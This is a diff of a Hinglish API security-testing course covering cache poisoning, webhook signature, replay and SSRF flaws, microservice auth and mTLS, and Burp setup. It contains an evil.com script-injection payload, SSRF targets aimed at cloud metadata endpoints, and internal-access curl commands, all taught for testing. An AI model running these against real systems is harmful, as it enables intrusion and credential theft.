-#### 5. 🔍 Visual - Screen Par Kya Dikhega
-**Security Headers Check:**
-- Burp ya browser dev tools mein response headers dekho.
-- Agar headers missing hain toh note karo.
-
-**Verbose Errors:**
-- Malformed input bhejo: `GET /api/user?id=abc` (integer expected).
-- Response mein SQL error dikhe: `"error": "SQLite3::SQLException: no such column: abc"` ya stack trace with full path.
-
-#### 6. ⚙️ Under the Hood
-- HSTS: Browser jab ye header dekhta hai to site ko HSTS list mein daal kar future requests automatically HTTPS par bhejta hai.
-- CSP: Whitelist-based policy, e.g., `default-src 'self'` means only same origin.
-- X-Content-Type-Options: Agar server `Content-Type: text/plain` bheje aur file mein HTML ho, browser usse render nahi karega.
-- Verbose Errors: Development mode mein on hote hain, production mein off hone chahiye. Frameworks (Django, Rails) by default production mein error pages show nahi karte, but misconfigure ho sakte hain.
-
-#### 7. 💻 Hands-On Step-by-Step
-**Security Headers:**
-
-**Step 1:** Target site ka koi bhi endpoint request karo (e.g., homepage ya API).
-
-**Step 2:** Response headers note karo. Check karo:
-- `Strict-Transport-Security` present?
-- `Content-Security-Policy` present?
-- `X-Content-Type-Options: nosniff` present?
-- `X-Frame-Options: DENY` ya `SAMEORIGIN` present?
-- `Referrer-Policy` present?
-
-**Step 3:** Agar missing hain, to report karo ki "Security headers missing".
-
-**Verbose Errors:**
-
-**Step 1:** API endpoints par fuzzing karo with invalid data:
-- Change data type (string instead of int)
-- Add special characters (`'", <, >`)
-- Extra parameters
-- Negative values, long strings
-
-**Step 2:** Responses mein dekho:
-- SQL errors (MySQL, PostgreSQL, etc.)
-- Stack traces (file paths like `/var/www/html/...`)
-- Internal IP addresses
-- Framework version info
-
-**Step 3:** Collect saare information disclosure points.
-
-#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
-- **Security Headers Success:** Headers present hain (secure). Actually hum check kar rahe hain missing ko, toh success for attacker ki headers missing hain. Toh "success" ka matlab vulnerable hai.
-- **Verbose Errors Success:** Detailed error message mila.
-
-#### 9. ⚖️ Comparison (HSTS vs CSP)
-| HSTS | CSP |
-|------|-----|
-| Enforces HTTPS | Controls resource loading |
-| Prevents SSL stripping | Prevents XSS and data injection |
-| One-time header | Detailed policy |
-
-#### 10. 🚫 Common Mistakes
-- **Mistake:** Sirf HSTS check karna. **Fix:** Saare relevant headers check karo.
-- **Mistake:** Verbose errors me sirf SQL errors dhundhna. **Fix:** Path disclosure, version disclosure bhi important hain.
-- **Mistake:** Error messages me sensitive info ko report karna bhoolna.
-
-#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
-- **Q:** Kya security headers missing se direct exploit ho sakta hai?
-  **A:** Nahin, lekin ye attack surface badhata hai. Jaise missing CSP se XSS asaan ho jata hai.
-- **Q:** Verbose errors se kya fayda?
-  **A:** Technology stack pata chal jata hai, phir us technology ki known vulnerabilities target kar sakte hain.
-
-#### 12. 🌍 Real-World Use Case
-**GitHub:** Ek bug report mein verbose error se internal path leak ho raha tha. Isse attacker ko source code structure ka pata chal gaya.
-
-#### 13. 🎨 Visual Diagram (ASCII Art)
-```
-Attacker sends malformed request -> Server responds with stack trace -> Attacker learns technology -> Plans further attack.
-```
-
-#### 14. 🛠️ Best Practices (Pro Tips)
-- **Pro Tip 1:** Security headers check karne ke liye online tools hain (securityheaders.com) ya Burp extension "Hackvertor".
-- **Pro Tip 2:** Verbose errors dhundhne ke liye Burp Intruder mein payloads like `'`, `"`, `\x00` etc. bhejo.
-- **Pro Tip 3:** Automation ke liye Nuclei templates use kar sakte ho.
-
-#### 15. ❓ FAQ (Interview Questions)
-- **Q1:** HSTS header ka kya kaam hai?
-  **A:** Browser ko force karta hai ki site sirf HTTPS par access ho, even if user HTTP link click kare.
-- **Q2:** Verbose errors se bachne ke upay?
-  **A:** Production mein debug mode off karo, custom error pages banao.
-- **Q3:** X-Content-Type-Options header kya prevent karta hai?
-  **A:** Browser ko MIME type sniffing se rokta hai, jisse executable content galat tarah se execute nahi hota.
-
-#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
-**"Headers missing hain to security dheeli, verbose errors hain to info leak ki meli."**
-
----
-
-### 🎯 Topic 7.6: API Cache Poisoning
-
-#### 1. 🎯 Title
-**API Cache Poisoning**
-
-#### 2. 🐣 Samjhane ke liye (Analogy)
-Sochiye aapke area mein ek chai wala hai jo chai banata hai aur ek dabbe mein rakh deta hai (cache). Jab bhi koi customer chai maangta hai, woh dabbe se nikaal kar de deta hai. Ab ek banda aata hai aur chai mein thoda namak mila deta hai (malicious payload) aur dabbe mein rakhta hai. Ab agli customer ko namak wali chai milti hai. Yahi cache poisoning hai. API caching mein bhi aisa hota hai—attacker ek specially crafted request karta hai jiska malicious response cache ho jata hai, aur baaki users ko wahi response serve hone lagta hai.
-
-#### 3. 📖 Technical Definition
-API cache poisoning tab hota hai jab attacker cache server (CDN, reverse proxy) ko dhokha dekar ek malicious response store karwa leta hai, jo baad mein legitimate users ko serve hota hai. Yeh typically unkeyed headers ke through hota hai—jaise `X-Forwarded-Host`, `X-Original-URL`—jinhe caching key mein include nahi kiya jaata, lekin server unki value ko response generate karne mein use karta hai. Attacker in headers ko modify karta hai aur cache ko malicious response store karne ke liye force karta hai.
-
-#### 4. 🧠 Zaroorat Kyun Hai?
-Cache poisoning se attacker:
-- Malicious JavaScript inject karwa kar XSS kar sakta hai.
-- Users ko phishing page par redirect kar sakta hai.
-- Sensitive data exfiltrate kar sakta hai.
-- Site ka normal functionality disrupt kar sakta hai.
-
-#### 5. 🔍 Visual - Screen Par Kya Dikhega
-**Victim request:**
-```
-GET /api/translations?lang=en HTTP/1.1
+POST /webhook HTTP/1.1
 Host: target.com
+X-Signature: sha256=9d5e8a...
+X-Timestamp: 1678901234
+X-Nonce: abc123
+Content-Type: application/json
+
+{
+  "event": "payment.success",
+  "order_id": "12345"
+}
 ```
-Normal response: `{"welcome":"Welcome"}`
+Burp mein yeh request aayegi. Tum check karoge:
+- Kya signature header hai?
+- Kya timestamp/nonce present hain?
+- Kya URL parameter mein internal IP daal sakte ho?
 
-**Attacker request:**
+### 6. ⚙️ Under the Hood
+**Signature Verification kaise hota hai:**
+1. Sender aur receiver ke paas ek **shared secret** hota hai (e.g., HMAC key).
+2. Sender request body + timestamp + nonce ko HMAC-SHA256 se hash karta hai aur `X-Signature` header mein bhejta hai.
+3. Receiver bhi same calculation karta hai aur compare karta hai. Agar match nahi kiya, request reject hoti hai.
+
+**Replay Attack Mechanism:**
+- Agar `X-Timestamp` nahi hai, attacker same request baar baar bhej sakta hai.
+- Agar `nonce` (unique random number) nahi hai, toh same request copy karke bhejna possible hai.
+- Proper implementation timestamp (+-5 min tolerance) aur nonce check karta hai.
+
+**SSRF via Webhook:**
+- Jab tum webhook URL register kar rahe ho, attacker `http://169.254.169.254/latest/meta-data/` (AWS metadata) daal sakta hai.
+- Server us URL par request bhejega aur sensitive data leak karega.
+
+### 7. 💻 Hands-On Step-by-Step (Teeno attacks)
+
+#### A) Lack of Signature Verification
+**Step 1:** Koi bhi webhook request capture karo (e.g., payment webhook).
+**Step 2:** Request ko Repeater mein bhejo aur body modify karo (e.g., order_id change karo).
+**Step 3:** Agar server bina signature verify kiye accept kar leta hai (200 OK response), toh vulnerability hai.
+**✅ Success:** Response 200 OK with body "success"
+**❌ Failure:** 401 Unauthorized ya 403 Forbidden
+
+#### B) Replay Attack
+**Step 1:** Ek valid webhook request capture karo.
+**Step 2:** Usse Repeater mein daal kar **same request dobara bhejo** (without any change).
+**Step 3:** Agar server accept kar leta hai, aur action duplicate ho jata hai (e.g., do baar payment processed), toh replay possible hai.
+**✅ Success:** 200 OK aur duplicate action.
+**❌ Failure:** 400/409 with "Already processed" ya timestamp expired.
+
+#### C) SSRF via Webhook
+**Step 1:** Webhook URL config karne wala endpoint dhundo (e.g., `POST /api/webhook` with `{"url": "http://attacker.com"}`).
+**Step 2:** URL ki jagah internal IP daalo, jaise:
+- `http://127.0.0.1:8080/admin`
+- `http://169.254.169.254/latest/meta-data/` (AWS)
+- `http://metadata.google.internal/` (GCP)
+**Step 3:** Agar response mein internal data dikhe, toh SSRF successful.
+**✅ Success:** Response mein internal data ya 200 OK from internal.
+**❌ Failure:** Timeout ya error "Invalid URL".
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+
+| Attack | Success Response | Failure Response |
+|--------|------------------|------------------|
+| No signature | 200 OK, action performed | 401/403, "Invalid signature" |
+| Replay | 200 OK, duplicate action | 409 Conflict, "Duplicate request" |
+| SSRF | Internal data in response | 400 Bad Request, timeout |
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Feature | Signed Webhook | Unsigned Webhook |
+|--------|----------------|------------------|
+| Verification | HMAC signature check | Koi verification nahi |
+| Security | Attacker fake nahi bhej sakta | Fake request possible |
+| Implementation | Secret key required | Bas URL chahiye |
+
+| Replay Protection | With Timestamp+Nonce | Without |
+|-------------------|----------------------|---------|
+| Request freshness | Check hota hai | Same request baar baar chalegi |
+| Duplicate handling | Reject duplicates | Duplicate actions possible |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** Sirf signature check karna, timestamp ignore karna.  
+  **Fix:** Timestamp bhi validate karo (e.g., 5 minute tolerance).
+- **Mistake:** Nonce database mein store na karna.  
+  **Fix:** Nonce ko cache karo taaki reuse na ho.
+- **Mistake:** Webhook URL allowlist na hona (kisi bhi URL ko allow karna).  
+  **Fix:** Sirf trusted domains allow karo, internal IPs block karo.
+- **Mistake:** GET webhooks mein body ignore karna, signature verification skip.  
+  **Fix:** Webhook ke liye sirf POST use karo aur body bhi sign karo.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "Timestamp bhi toh attacker change kar sakta hai?"  
+**A:** Haan, lekin signature mein timestamp bhi included hota hai. Agar timestamp change karoge toh signature mismatch ho jayega. Isliye dono milke security dete hain.
+
+**Q:** "Replay attack se bachne ke liye nonce kaise kaam karta hai?"  
+**A:** Har request ke saath ek unique random number (nonce) bheja jata hai. Server nonce ko store karta hai aur agar same nonce dobara aaya toh reject kar deta hai.
+
+**Q:** "SSRF ke liye webhook URL kaise test karein agar URL field hidden ho?"  
+**A:** Kuch applications mein webhook URL config karne ka option UI mein hota hai. Wahan internal IP daal kar check karo. Ya fir intercept karo request mein URL parameter modify karo.
+
+### 12. 🌍 Real-World Use Case
+**Slack Webhook Misconfiguration**  
+Slack mein incoming webhooks se messages post kar sakte ho. Agar kisi team ne webhook URL public kar diya aur signature verify nahi kiya, toh koi bhi attacker us URL par POST bhejkar fake messages daal sakta hai. Isse phishing ya misinformation spread ho sakti hai.
+
+**Shopify Payment Webhook Replay**  
+Shopify ke webhook mein agar timestamp missing tha, toh attacker ek valid payment success request capture karke baar baar bhej kar multiple order fulfillments trigger kar sakta tha (real bug bounty report).
+
+### 13. 🎨 Visual Diagram (ASCII Art)
 ```
-GET /api/translations?lang=en HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil.com
-```
-Agar server `X-Forwarded-Host` ko use karke response mein links generate karta hai (jaise `<script src="http://evil.com/script.js">`), aur cache server is response ko cache kar leta hai, toh baaki users ko bhi malicious script serve hogi.
-
-#### 6. ⚙️ Under the Hood
-- **Caching Key:** CDN (Cloudflare, Akamai) request ke kuch parts ko mila kar cache key banata hai—usually method, host, path, query parameters. Headers like `X-Forwarded-Host` typically key mein include nahi hote.
-- **Unkeyed Headers:** Agar server unkeyed headers ki value ko response mein use karta hai (e.g., dynamic redirect base URL), toh attacker unhe control kar sakta hai.
-- **Process:**
-  1. Attacker request bhejta hai with malicious unkeyed header.
-  2. Server response generate karta hai using that header.
-  3. Cache server response ko store kar leta hai (kyunki cache key (method+path+query) same hai, but header different).
-  4. Ab koi bhi user same URL request karega to cached malicious response milega.
-
-#### 7. 💻 Hands-On Step-by-Step
-**Identify unkeyed headers:**
-- Pehle kisi endpoint ka normal response dekho.
-- Burp mein request bhejo with extra headers like `X-Forwarded-Host: example.com`, `X-Forwarded-Scheme: http`, `X-Original-URL: /admin`, `X-Rewrite-URL: /`.
-- Dekho response mein koi change aaya? Jaise redirect URL badla, ya link generate hua using header value.
-
-**Poisoning attempt:**
-
-**Step 1:** Target endpoint choose karo jo caching use karta ho (e.g., static asset, translations). Identify karne ke liye duplicate request bhej kar response time check karo—pehli request slow, second fast toh cache hai.
-
-**Step 2:** Unkeyed header dhundho jo response ko affect karta ho. Example:
-```
-GET /api/translations?lang=en HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil.com
-```
-Response mein kuch aisa dikhe:
-```
-{"welcome":"Welcome","script":"<script src=\"//evil.com/payload.js\">"}
+Attacker                               Target Server
+   |                                         |
+   | 1. Fake webhook (no signature)          |
+   |---------------------------------------->|
+   |                           (Server sochta hai valid hai)
+   | 2. Action perform (payment success)     |
+   |                                         |
+   | 3. Replay same request                  |
+   |---------------------------------------->|
+   |                           (Duplicate action)
+   |                                         |
+   | 4. SSRF via webhook URL: internal IP    |
+   |---------------------------------------->|
+   |                           (Server internal request karega)
+   |<----------------------------------------|
+   |        Internal data leak
 ```
 
-**Step 3:** Ab ye request bhejo multiple times taaki cache ho jaye.
+### 14. 🛠️ Best Practices (Pro Tips)
+- **Testing tip:** Burp Suite mein `Turbo Intruder` use karo replay attack ko automate karne ke liye.
+- **Automation:** `Autorize` extension se check karo ki bina signature ke request ja rahi hai ya nahi.
+- **Remediation timeline:** 
+  - Signature missing → Critical, 24 hours mein fix.
+  - Replay possible → High, 3 days.
+  - SSRF via webhook → High/Critical depending on exposure.
+- **PoC writing:** Screenshot do jisme ek hi request baar baar bheji gayi ho aur duplicate action ho.
 
-**Step 4:** Verify ki cache hua ya nahi—doosre browser ya incognito mein same URL open karo, aur malicious response dekho.
+### 15. ❓ FAQ (Interview Questions)
+**Q1: Webhook mein signature verification kaise implement karte hain?**  
+A: HMAC-SHA256 use karte hain. Request body + timestamp ko secret key se hash karke header mein bhejte hain. Receiver same calculation karta hai aur compare.
 
-#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
-- **Success:** Baaki users ko malicious response serve ho raha hai.
-- **Failure:** Cached response normal hai, ya header affect nahi kar raha.
+**Q2: Replay attack se bachne ke liye kya karna chahiye?**  
+A: Timestamp check (+-5 min) aur nonce (unique) use karo. Nonce ko database mein store karo taaki reuse na ho.
 
-#### 9. ⚖️ Comparison (Cache Poisoning vs Cache Deception)
-| Cache Poisoning | Cache Deception |
-|-----------------|-----------------|
-| Attacker cache mein malicious content store karwaye | Attacker sensitive content cache mein store karwaye (e.g., profile page) |
-| Server ya CDN ko galat response store karne ke liye | URL manipulation se private data cache ho jaye |
-| All users affected | Only if cache stores private data |
+**Q3: Webhook URL mein SSRF vulnerability kaise test karte hain?**  
+A: Internal IPs (127.0.0.1, 169.254.169.254) ya internal service hostnames daal kar dekho ki response mein kuch aata hai ya nahi.
 
-#### 10. 🚫 Common Mistakes
-- **Mistake:** Sirf ek header try karna. **Fix:** Multiple unkeyed headers combinations try karo (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Prefix`, etc.)
-- **Mistake:** Cached response ko verify karne ke liye same browser/session use karna. **Fix:** Different browser ya incognito use karo, ya curl se.
-- **Mistake:** Unkeyed header ki value ko properly encode na karna. **Fix:** Malicious payload encode karo (URL encoding, etc.)
+**Q4: Webhook security ke liye kaunsa HTTP method best hai?**  
+A: POST, kyunki body hoti hai aur signed easily ho sakti hai. GET mein body usually ignore hoti hai.
 
-#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
-- **Q:** Cache poisoning ke liye server side caching (Redis, Varnish) aur CDN dono mein same technique?
-  **A:** Ha, concept same hai. CDN mein bhi unkeyed headers ka issue ho sakta hai.
-- **Q:** Kya request me `Host` header bhi unkeyed ho sakta hai?
-  **A:** `Host` almost always keyed hota hai, lekin kabhi kabhi CDN `Host` ko key nahi karta? Usually keyed hota hai.
-- **Q:** Agar server unkeyed header use nahi karta toh kya?
-  **A:** Toh cache poisoning possible nahi.
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"Webhook bharosa nahi, signature aur timestamp se hi pachtawa nahi."
 
-#### 12. 🌍 Real-World Use Case
-**Cloudflare CDN Cache Poisoning:** 2020 mein ek researcher ne Cloudflare ke edge servers mein cache poisoning vulnerability dhundhi using `X-Forwarded-Host` header. Isse attacker kisi bhi site ke cache mein malicious content store karwa sakta tha.
+---
 
-#### 13. 🎨 Visual Diagram (ASCII Art)
+## Topic 8.2: Microservices Communication Security
+
+### 1. 🎯 Title
+Microservices Communication – Service-to-Service Auth aur mTLS Misconfig
+
+### 2. 🐣 Samjhane ke liye (Analogy)
+Sochein ek **bada office** hai jisme multiple **departments** hain: Accounts, HR, IT. Har department apna kaam karta hai, lekin kabhi kabhi unhe ek dusre se files share karni padti hain.
+
+Ab agar **koi bhi** department bina ID card ke doosre department mein ghus jaye aur files le jaye, toh problem hai. Isliye unke paas **internal passes** (service-to-service auth) hote hain. Jaise Accounts department HR se salary data maangta hai, toh uske paas ek **token** hona chahiye.
+
+Aur agar wo secure channel use karte hain, toh **mutual TLS (mTLS)** hota hai – dono side certificate check karte hain ki sahi department hai ya nahi.
+
+Lekin agar **mTLS misconfigure** hai (e.g., server sirf client certificate maangta hai par check nahi karta), toh koi bhi fake department certificate bana ke access le sakta hai.
+
+### 3. 📖 Technical Definition
+**Microservices communication** internal APIs ke through hoti hai jo ek service doosri service ko call karti hai. Security ensure karna zaroori hai:
+- **Service-to-Service Auth:** Har request mein authentication token (JWT, API key) hona chahiye, chahe internal ho.
+- **mTLS (Mutual TLS):** Dono sides (client aur server) apne TLS certificates present karte hain aur validate karte hain ki trusted CA se issued hai.
+- **Misconfigurations:** Agar internal APIs bina auth accessible hain, ya mTLS properly validate nahi hota, toh attacker lateral movement kar sakta hai.
+
+### 4. 🧠 Zaroorat Kyun Hai?
+- Internal APIs often have sensitive data (user details, payments). Agar bina auth accessible hain, toh koi bhi compromised service ya attacker direct access le sakta hai.
+- mTLS ensure karta hai ki sirf trusted services communicate kar sakein, MITM attacks se bachata hai.
+- Microservices environment mein **network segmentation** (internal network) ke bawajood, auth zaroori hai kyunki internal network bhi compromised ho sakta hai.
+
+### 5. 🔍 Visual - Screen Par Kya Dikhega
+**Internal API request (without auth):**
 ```
-Attacker -> Request with X-Forwarded-Host: evil.com -> Server generates response using that -> Cache stores malicious response -> User requests same URL -> Gets malicious response from cache.
+GET /internal/user/123 HTTP/1.1
+Host: service-a.internal:8080
+```
+Agar yeh request bina kisi token ke data return kar rahi hai, toh vulnerable hai.
+
+**mTLS enabled request:**
+Client certificate negotiation TLS handshake mein hoti hai. Burp mein aap client certificate configure kar sakte ho.
+
+### 6. ⚙️ Under the Hood
+**Service-to-Service Auth:**
+- Internal APIs usually `internal` domain ya IP par host hoti hain. Developers sochte hain "internal network safe hai", isliye auth nahi lagate.
+- Attacker agar kisi service mein foothold le leta hai (e.g., SSRF, RCE), toh wo internal APIs call kar sakta hai bina auth ke.
+
+**mTLS Misconfig:**
+- mTLS mein server apna certificate present karta hai aur client se bhi certificate maangta hai.
+- Server ko client certificate validate karna chahiye: expiry, signature, issuer, subject.
+- Misconfig: Server sirf certificate maangta hai lekin validate nahi karta (e.g., koi bhi certificate accept). Is case mein attacker self-signed certificate bana ke bhej sakta hai.
+
+### 7. 💻 Hands-On Step-by-Step
+
+#### A) Service-to-Service Auth Bypass
+**Step 1:** Internal API endpoints discover karo. Common patterns:
+- `service-a.internal`, `service-b:8080`, `http://internal-api.company.com`
+- API paths: `/internal`, `/v1/internal`, `/service-a/api`
+**Step 2:** Burp ya curl se request bhejo bina kisi auth header ke.
+```
+curl -H "Host: service-a.internal" http://<target-ip>:8080/internal/user/123
+```
+**Step 3:** Agar response mein sensitive data aata hai (e.g., user details), toh missing auth vulnerability hai.
+**✅ Success:** 200 OK with data.
+**❌ Failure:** 401 Unauthorized ya 403 Forbidden.
+
+#### B) mTLS Misconfiguration Testing
+**Step 1:** pata karo ki target mTLS use kar raha hai ya nahi (e.g., documentation, ya agar normal request par certificate prompt aata hai).
+**Step 2:** Burp mein client certificate add karo: **Proxy > Options > TLS > Client Certificate**.
+- Tum koi bhi self-signed certificate bana sakte ho (OpenSSL se) aur use kar sakte ho.
+**Step 3:** Request bhejo. Agar server accept kar leta hai (200 OK), toh mTLS misconfig hai kyunki certificate validate nahi ho raha.
+**✅ Success:** 200 OK with self-signed certificate.
+**❌ Failure:** 403 / 400 with "Invalid certificate".
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+
+| Test | Success | Failure |
+|------|---------|---------|
+| No Auth | 200 OK with data | 401/403 |
+| mTLS self-signed | 200 OK | 403/400 |
+
+### 9. ⚖️ Comparison (X vs Y)
+
+| Feature | Service-to-Service Auth | mTLS |
+|--------|------------------------|------|
+| Layer | Application layer (HTTP) | Transport layer (TLS) |
+| Mechanism | Token (JWT, API key) | X.509 certificates |
+| Use case | Authorization | Authentication + encryption |
+| Misconfig risk | Missing auth | Weak certificate validation |
+
+### 10. 🚫 Common Mistakes (Beginner Traps)
+- **Mistake:** Internal APIs ko "localhost" ya "127.0.0.1" par bind karna aur sochna ki sirf local access hai.  
+  **Fix:** Network namespace separate karo aur auth lagao.
+- **Mistake:** mTLS mein sirf client certificate maangna, but issuer check na karna.  
+  **Fix:** Validate certificate chain, issuer, aur subject.
+- **Mistake:** Internal API endpoints mein predictable names (e.g., `/internal/user`).  
+  **Fix:** Randomize ya use service mesh with proper auth.
+
+### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+**Q:** "Internal network mein toh firewall hota hai, auth ki zaroorat kya hai?"  
+**A:** Firewall network layer protect karta hai, lekin agar koi service compromised ho gayi (e.g., through web app), toh attacker internal network mein ghus sakta hai. Isliye internal APIs ko bhi auth chahiye.
+
+**Q:** "mTLS ka certificate verification bypass kaise karein?"  
+**A:** Self-signed certificate bana kar bhejo. Agar server accept kar leta hai, toh verify nahi ho raha. Agar reject karta hai, toh proper validation hai.
+
+**Q:** "Service-to-service auth mein JWT use karna safe hai?"  
+**A:** Haan, lekin JWT bhi internal services ke beech share karna secure channel par hona chahiye. Aur expiry time kam rakho.
+
+### 12. 🌍 Real-World Use Case
+**Uber Microservices Breach (2016)**  
+Attacker ne GitHub repo se internal API credentials leak kiye. Unhone internal services ko bina auth access kiya aur sensitive rider data chura liya. Is incident ke baad Uber ne service-to-service auth strongly implement kiya.
+
+**Kubernetes mTLS Misconfig**  
+Kubernetes clusters mein service mesh (Istio) mTLS enable kar sakta hai. Agar misconfig ho (e.g., `PERMISSIVE` mode), toh services bina certificate ke bhi communicate kar sakti hain, jisse attacker unencrypted traffic sniff kar sakta hai.
+
+### 13. 🎨 Visual Diagram (ASCII Art)
+```
+Attacker -> Compromised Web App -> Internal Network
+                                    |
+                                    v
+                        +---------------------------+
+                        | service-a.internal:8080   |
+                        | (bina auth)               |
+                        +---------------------------+
+                                    |
+                                    v
+                        +---------------------------+
+                        | service-b:8080            |
+                        | (mTLS misconfig)          |
+                        +---------------------------+
+                                    |
+                                    v
+                        Sensitive Database
 ```
 
-#### 14. 🛠️ Best Practices (Pro Tips)
-- **Pro Tip 1:** Cache poisoning ke liye "Web Cache Entanglement" technique bhi hoti hai (different URLs same cache key). Iske liye path normalization fuzz karo.
-- **Pro Tip 2:** Unkeyed headers dhundhne ke liye Burp intruder mein common header wordlist lagao.
-- **Pro Tip 3:** Response mein changes detect karne ke liye visual inspection ya diff tools use karo.
+### 14. 🛠️ Best Practices (Pro Tips)
+- **Testing tip:** Internal API discovery ke liye `ffuf` use karo common internal paths ke saath (`/internal/api`, `/v1/internal`).
+- **Automation:** `Nuclei` templates hain internal API exposure check karne ke liye.
+- **Remediation timeline:**
+  - Missing service-to-service auth → Critical, 24 hours.
+  - mTLS misconfig → High, 2-3 days.
+- **mTLS testing:** OpenSSL se self-signed certificate banao:
+  ```
+  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+  ```
+  Burp mein import karo.
 
-#### 15. ❓ FAQ (Interview Questions)
-- **Q1:** Cache poisoning aur cache deception mein antar?
-  **A:** Poisoning me attacker control karta hai content, deception me sensitive data accidentally cache ho jata hai.
-- **Q2:** Cache poisoning se bachne ke upay?
-  **A:** Caching key mein saare relevant headers include karo, aur unkeyed headers ki value ko response mein use mat karo.
-- **Q3:** CDN caching me common unkeyed headers kaun se hain?
-  **A:** `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For` (kabhi kabhi).
+### 15. ❓ FAQ (Interview Questions)
+**Q1: Microservices environment mein internal APIs ko secure karne ke kya tarike hain?**  
+A: Service mesh (Istio) use karo jisme mTLS aur authorization policies built-in hain. Ya fir har service ke beech API keys ya JWT use karo.
 
-#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
-**"Unkeyed header me jahar ghol, cache mein bhar, users ko baant de sabko."**
+**Q2: mTLS ka kya fayda hai?**  
+A: Dono sides authenticate hoti hain aur communication encrypted hoti hai. Man-in-the-middle attack impossible ho jata hai.
+
+**Q3: Service-to-service auth bypass kaise test karte hain?**  
+A: Internal API endpoints ko enumerate karo aur bina auth header ke request bhejo. Agar data milta hai, toh vulnerable.
+
+**Q4: mTLS misconfig ka example do?**  
+A: Server sirf client certificate maangta hai lekin uski validity check nahi karta (e.g., self-signed accept). Ya fir server mTLS mode mein hai but fallback to plaintext allow karta hai.
+
+### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+"Internal bharosa nahi, auth aur mTLS se hi microservices safe."
+
+---
+
+========================================================================================
+
+# ⚙️ Module 9: Professional Tooling & Automation
+
+---
+
+## Topic 9.1: Burp Suite Mastery
+
+### 1. 🎯 Title
+Burp Suite Mastery – Scope, Color Coding, aur Intercept Rules
+
+### 2. 🐣 Samjhane ke liye (Analogy)
+Maan lo tum ek **detective** ho jo sirf ek **specific ghar** (target domain) ki surveillance karna chahta hai. Agar tum saare sheher ki CCTV dekhoge, toh tumhara dimag ghoom jayega. Isliye tum apna **scope** set karte ho – sirf us ghar ki feeds dekho.
+
+**Color coding** – Jaise detective alag alag rang ke pins lagata hai map par (red – dangerous, yellow – suspicious). Tum bhi important requests ko highlight kar sakte ho.
+
+**Intercept response rules** – Jaise detective ne ek rule banaya ki agar koi shaks raat 10 baje ghar se nikle, toh turant report karo. Tum bhi Burp ko bata sakte ho ki kis type ki response ko intercept karna hai.
+
+### 3. 📖 Technical Definition
+Burp Suite ek intercepting proxy hai jo HTTP/HTTPS traffic ko capture aur modify karta hai. Mastery ka matlab hai tools ko efficiently use karna taaki testing fast aur focused ho:
+- **Scope Configuration:** Target domain/subdomains define karna, taaki irrelevant traffic filter ho jaye.
+- **Color Coding:** Requests ko highlight karna based on importance (e.g., auth, BOLA, GraphQL).
+- **Intercept Response Rules:** Burp ko rules-based response interception ke liye configure karna (e.g., jab response mein "password" ho).
+
+### 4. 🧠 Zaroorat Kyun Hai?
+- **Scope:** Bina scope ke, Burp mein saari traffic (google, ads, CDN) dikhegi – confusion aur performance slow.
+- **Color Coding:** Hundreds requests mein se important ones instantly identify karne ke liye.
+- **Intercept Rules:** Manual testing mein time bachata hai – specific responses ko automatically rok kar inspect kar sakte ho.
+
+### 5. 🔍 Visual - Screen Par Kya Dikhega
+
+**Scope Configuration:**
+- Target tab → Scope → "Add" → Domain or IP daalo.
+- Proxy → HTTP History → Filter bar → "Show only in-scope items" tick karo.
+- Ab sirf target domain ki requests dikhengi.
+
+**Color Coding:**
+- Kisi request par right-click → "Add to scope" ya "Highlight" → Choose color.
+- HTTP History mein wo request uss color mein highlight ho jayegi.
+
+**Intercept Response Rules:**
+- Proxy → Options → "Intercept Response based on rules" check karo.
+- "Add rule" – e.g., Match `password` in response body → Intercept.
+
+### 6. ⚙️ Under the Hood
+- Scope matching: Burp URL ke host part ko compare karta hai. Wildcards (`*.target.com`) bhi support karta hai.
+- Color coding: Burp internal memory mein highlight info store karta hai, session ke dauran.
+- Intercept rules: Har response aane par Burp rule set match karta hai; agar match ho, toh intercept kar ke UI dikhata hai.
+
+### 7. 💻 Hands-On Step-by-Step
+
+#### A) Scope Set Karna
+1. Burp open karo, **Target** tab → **Scope** sub-tab.
+2. "Add" button click karo.
+3. "Add Host" window mein target domain likho (e.g., `api.target.com`). Port 80/443 rahne do.
+4. OK karo.
+5. Ab **Proxy** → **HTTP History** → Filter bar (top-right) → "Show only in-scope items" checkbox tick karo.
+6. **Success:** Ab sirf target domain ki requests dikhni chahiye.
+   **Failure:** Agar irrelevant requests dikh rahi hain, toh filter galat hai ya scope sahi se add nahi hua.
+
+#### B) Request Highlight Karna
+1. Kisi interesting request par right-click.
+2. "Highlight" → Choose red/yellow/blue etc.
+3. Ab wo request history mein highlight ho jayegi.
+4. Filter bhi laga sakte ho: Filter bar mein "Show only highlighted items" select karo.
+
+#### C) Intercept Response Rules Enable Karna
+1. **Proxy** → **Options** → "Response Interception" section.
+2. "Intercept response based on the following rules" check karo.
+3. "Add" button click karo.
+   - **Match type:** `Response body`
+   - **Match condition:** `Contains`
+   - **Pattern:** `"password"` (ya koi bhi keyword)
+4. OK karo. Ab jab bhi kisi response mein "password" aayega, Burp use intercept karega.
+5. Test karo: koi request bhejo jiska response mein "password" ho. Burp intercept karega.
+   **Success:** Intercept window open hoti hai with response.
+   **Failure:** Rule trigger nahi hota – pattern match nahi ho raha ya rule disabled.
+
+### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+
+| Task | Success Indicator | Failure Indicator |
+|------|-------------------|-------------------|
+| Scope set | Sirf target domain requests in history | Google/Facebook requests bhi dikhen |
